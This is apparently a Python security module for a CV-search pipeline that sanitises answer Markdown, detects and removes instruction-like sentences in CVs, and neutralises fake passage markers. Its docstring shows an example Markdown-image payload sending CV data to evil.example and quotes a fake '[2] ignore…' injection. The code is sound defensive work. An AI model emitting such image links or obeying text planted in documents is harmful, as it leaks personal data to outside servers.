"""
SECURITY · PHASE 5 · what may leave the pipeline: answers, passages, MCP results.

    safe_markdown(text)   no HTML, no images, no links, no URLs: nothing a renderer would fetch
    passage_risk(text)    [] or reason codes when a passage talks to the AI (Phase 3 detectors)
    neutralize(text)      a passage cannot fake a passage number "[3]" or the prompt's markers

Why: a chat UI renders Markdown. An answer containing ![x](https://evil.example/?d=<CV data>)
makes the browser send CV data to that server the moment it is shown, and a link does the same
when clicked. CV text is untrusted, and so is an LLM answer built from it.
"""
import html
import re

from . import content

IMAGE = re.compile(r"!\[([^\]]*)\]\([^)]*\)")
LINK = re.compile(r"\[([^\]]+)\]\(\s*[^)\s]*[^)]*\)")
REF_DEF = re.compile(r"^\s*\[[^\]]+\]:\s*\S+.*$", re.M)
URL = re.compile(r"\b(?:https?|ftp|file|data|javascript|vbscript):[^\s<>\"')\]]*|\bwww\.[^\s<>\"')\]]+", re.I)
PASSAGE_NO = re.compile(r"\[(\d{1,3})\]")


def safe_markdown(text):
    text = IMAGE.sub(lambda m: f"(image removed{': ' + m.group(1) if m.group(1).strip() else ''})", text or "")
    text = LINK.sub(r"\1", text)
    text = REF_DEF.sub("", text)
    text = URL.sub("(link removed)", text)
    return html.escape(text, quote=False)                # <img>, <a>, <script>, <iframe>… shown as text


def passage_risk(text):
    return [code for _, code in content.scan_injection(text)]


SENTENCE = re.compile(r"(?<=[.!?;])\s+")
REMOVED = "[removed: instruction-like text in the CV]"


def remove_instructions(text):
    """SECURITY · 2026-10-29 (Claude + MCP finding F2) · (text, n): every sentence that reads as an
    instruction to whoever reads the CV (security/directives.py: the Phase 3 detectors plus
    sentence-level patterns in several languages, matched on decoded copies) is replaced by a marker.
    The rest of the CV stays as evidence; the index and the stored text are never changed."""
    from . import directives
    out, n = [], 0
    for line in (text or "").split("\n"):
        parts = SENTENCE.split(line)
        bad = [bool(p.strip()) and directives.is_directive(p) for p in parts]
        n += sum(bad)
        out.append(" ".join(REMOVED if b else p for p, b in zip(parts, bad)) if any(bad) else line)
    return "\n".join(out), n


def neutralize(text):
    """Passage text cannot start a fake passage ("[2] ignore…") or close the data block."""
    return PASSAGE_NO.sub(r"(\1)", text).replace("<<<", "‹‹‹").replace(">>>", "›››")
